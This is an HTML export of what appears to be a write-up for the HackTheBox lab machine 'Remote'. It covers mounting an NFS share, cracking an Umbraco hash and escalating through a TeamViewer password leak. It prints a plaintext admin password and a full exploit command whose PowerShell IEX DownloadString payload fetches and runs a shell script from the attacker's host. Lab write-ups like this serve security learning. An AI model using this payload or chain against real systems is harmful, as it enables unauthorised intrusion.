<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>remote</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  <script></script>
</head>
<body><div class="page"><h1 class="title">remote</h1><br/><img src="{{site.baseurl}}/assets/images/remote/1-1.png" alt="{{site.baseurl}}/assets/images/remote/1-1.png" /><br /><br />Remote is a medium-difficulty box, in which we mount an public nfs share to find creds, exploit the CMS with an Authenticated RCE, and finally get admin access by exploiting a vulnerability in teamviewer<br /><br />Nmap shows loads of open ports<br /><img src="{{site.baseurl}}/assets/images/remote/1-2.png" alt="{{site.baseurl}}/assets/images/remote/1-2.png" /><br /><br /><br />webserver is running CMS Umbraco<br /><img src="{{site.baseurl}}/assets/images/remote/1-3.png" alt="{{site.baseurl}}/assets/images/remote/1-3.png" /><br /><br />port 2049 has a nfs share mounted<br /><img src="{{site.baseurl}}/assets/images/remote/1-4.png" alt="{{site.baseurl}}/assets/images/remote/1-4.png" />  <img src="{{site.baseurl}}/assets/images/remote/1-5.png" alt="{{site.baseurl}}/assets/images/remote/1-5.png" /><br /><br />so we mount the share with <br /><div class="codebox"><div class="codebox">mount&nbsp;-t&nbsp;nfs&nbsp;10.10.10.180:/site_backups&nbsp;/htb/remote/backup</div></div><br /><br />Theres a hash in App_Data/Umbraco.sdf<br /><img src="{{site.baseurl}}/assets/images/remote/1-6.png" alt="{{site.baseurl}}/assets/images/remote/1-6.png" /><br /><br />crack it with hashcat<br /><img src="{{site.baseurl}}/assets/images/remote/1-7.png" alt="{{site.baseurl}}/assets/images/remote/1-7.png" /><br /><br />we can now login to umbraco<br /><br /><img src="{{site.baseurl}}/assets/images/remote/1-8.png" alt="{{site.baseurl}}/assets/images/remote/1-8.png" /><br /><br />There is a Authenticated RCE exploit available for Umbraco: <a href="https://github.com/noraj/Umbraco-RCE">https://github.com/noraj/Umbraco-RCE</a><br />get initial foothold on remote with<br /><div class="codebox"><div class="codebox">python3&nbsp;exploit.py&nbsp;-u&nbsp;admin@htb.local&nbsp;-p&nbsp;baconandcheese&nbsp;-i&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>remote.htb<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;-c&nbsp;powershell.exe&nbsp;-a&nbsp;<span style="color:#3ad900;font-weight:400">"IEX&nbsp;(New-Object&nbsp;Net.WebClient).DownloadString('http://10.10.16.12/minishell.ps1')"</span></div></div><br /><br /><img src="{{site.baseurl}}/assets/images/remote/1-9.png" alt="{{site.baseurl}}/assets/images/remote/1-9.png" /><br /><br />run winpeas64, teamviewer7 is installed on the box<br /><img src="{{site.baseurl}}/assets/images/remote/1-10.png" alt="{{site.baseurl}}/assets/images/remote/1-10.png" /><br /><br />Teamviewer is vulnerable, it gives away the teamviewer password, you can easily follow this video: <a href="https://www.youtube.com/watch?v=3AOg6OZD1H0">https://www.youtube.com/watch?v=3AOg6OZD1H0</a><br /><br /><img src="{{site.baseurl}}/assets/images/remote/1-11.png" alt="{{site.baseurl}}/assets/images/remote/1-11.png" /><br /><br />and we get admin access with evil-winrm<br /><img src="{{site.baseurl}}/assets/images/remote/1-12.png" alt="{{site.baseurl}}/assets/images/remote/1-12.png" /><br /><br /></div></body></html>
